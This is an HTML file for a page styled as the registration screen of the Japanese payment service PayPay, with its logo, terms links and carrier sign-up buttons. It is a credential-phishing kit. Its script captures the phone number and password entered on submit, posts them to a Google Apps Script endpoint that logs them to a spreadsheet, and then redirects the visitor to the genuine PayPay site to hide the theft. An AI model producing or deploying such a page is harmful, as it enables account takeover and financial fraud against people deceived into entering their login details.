<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPay風 新規登録ページ</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }

        header {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo {
            width: 100px;
        }

        .tabs {
            display: flex;
            justify-content: space-around;
            margin-bottom: 20px;
        }

        .tab {
            font-size: 16px;
            padding: 10px;
            color: #999;
            cursor: pointer;
        }

        .tab.active {
            color: #f33;
            border-bottom: 2px solid #f33;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .password-field {
            position: relative;
        }

        .invite-code {
            background-color: #ddd;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            margin-bottom: 20px;
            cursor: pointer;
        }

        .terms {
            font-size: 12px;
            color: #666;
            margin-bottom: 20px;
            text-align: center;
        }

        .register-btn {
            background-color: #f33;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .alternative-register {
            text-align: center;
            margin-top: 20px;
        }

        .register-options button {
            width: 45%;
            padding: 10px;
            margin: 5px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .register-yahoo {
            background-color: #ff0019;
            color: white;
        }

        .register-softbank {
            background-color: #007aff;
            color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="paypay-logo.png" alt="PayPay ロゴ" class="logo">
        </header>
        <div class="registration">
            <ul class="tabs">
                <li class="tab active">新規登録</li>
                <li class="tab">ログイン</li>
            </ul>
            <form id="registration-form">
                <input type="tel" placeholder="携帯電話番号" class="input-field" name="phone-number" required>
                <div class="password-field">
                    <input type="password" placeholder="パスワード" class="input-field" name="password" required>
                </div>
                <button type="button" class="invite-code">紹介コードを入力する</button>
                <p class="terms">
                    PayPay利用規約, PayPayマネーライト資金決済法表示, PayPayマネー資金決済法表示, プライバシーポリシー
                </p>
                <button type="submit" class="register-btn">上記に同意して新規登録</button>
            </form>
        </div>
        <div class="alternative-register">
            <p>新しい電話番号に変更した場合</p>
            <div class="register-options">
                <button class="register-yahoo">Yahoo! JAPAN IDで新規登録</button>
                <button class="register-softbank">ソフトバンク・ワイモバイル・LINEMOで新規登録</button>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('registration-form').addEventListener('submit', function(event) {
            event.preventDefault(); // フォームのデフォルト送信を防ぐ

            // フォームデータを取得
            const formData = new FormData(document.getElementById('registration-form'));

            // Googleスプレッドシートにデータを送信する
            submitToGoogleSheets(formData);

            // PayPayのホームページにリダイレクトする
            window.location.href = 'https://paypay.ne.jp/';
        });

        function submitToGoogleSheets(formData) {
            fetch('https://script.google.com/macros/s/YOUR_DEPLOYED_URL/exec', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => console.log('Success:', data))
            .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>
